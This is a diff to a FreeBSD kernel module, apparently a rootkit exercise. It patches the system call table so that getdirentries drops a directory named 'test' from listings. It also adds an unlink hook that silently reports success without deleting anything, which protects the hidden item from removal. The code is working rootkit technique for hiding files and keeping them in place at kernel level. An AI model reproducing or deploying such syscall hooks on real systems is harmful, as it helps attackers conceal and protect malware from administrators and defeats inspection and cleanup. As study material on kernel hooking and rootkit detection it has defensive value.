@@ -32,11 +32,29 @@
 
 /* Options */
 #define KERNDEBUG 1
+#define HIDDENDIR "test"
 
-/* getdirentries hook */
+/* file_protector implementing function */
+static int file_protector(struct thread *td, void *syscall_args)
+{
+    uprintf("Welcome!\n");
+    return (0);
+}
+
+/* unlink hook - prevent file/directory removal */
+static int unlink_hook(struct thread *td, void *syscall_args)
+{
+    struct unlink_args /* {
+            const char *path //path to the file/directory to be removed
+            }*/*args;
+    args = (struct unlink_args *)syscall_args;
+    return (0);
+
+}
+
+/* getdirentries hook - hide file/directory */
 static int getdirentries_hook(struct thread *td, void *syscall_args)
 {
-    char hide[]="test";
     struct getdirentries_args /* {
                 int fd, //[man]file descriptor
                 char *buf, //[man]buffer space, results will be returned to here
@@ -79,7 +97,7 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
             count -= reclen;
 
             /* Check if the entry name matches the hide config */
-            if (strcmp((char *)&(currptr->d_name), (char *)&hide) == 0){
+            if (strcmp((char *)&(currptr->d_name), (char *)HIDDENDIR) == 0){
                 /* If the currptr is pointing to the last entry, no need to remove */
                 if (count != 0) {
                     /* Copy the rest of entries to the address of current node, overwrite the hidden file */
@@ -118,8 +136,8 @@ static int getdirentries_hook(struct thread *td, void *syscall_args)
 
 /* Prepare sysent to register the new system call */
 static struct sysent getdirentries_hook_sysent = {
-    4,  /* Number of arguments */
-    getdirentries_hook /* implementing function */
+    1,  /* Number of arguments */
+    file_protector /* implementing function */
 };
 
 /* Define the offset in sysent[] where the new system call is to be allocated */
@@ -133,15 +151,17 @@ static int load(struct module *module, int cmd, void *arg)
     switch(cmd) {
         case MOD_LOAD:
             #if KERNDEBUG == 1
-            uprintf("System call loaded at offset %d.\n", offset);
+            uprintf("Hooking getdirentries, unlink....\n");
             #endif
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
+            sysent[SYS_unlink].sy_call = (sy_call_t *)unlink_hook;
             break;
         case MOD_UNLOAD:
             #if KERNDEBUG == 1
-            uprintf("System call unloaded from offset %d.\n", offset);
+            uprintf("Unhooking getdirentries, unlink....\n");
             #endif
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+            sysent[SYS_unlink].sy_call = (sy_call_t *)sys_unlink;
             break;
         default:
             error = EOPNOTSUPP; /* Operation not supported */
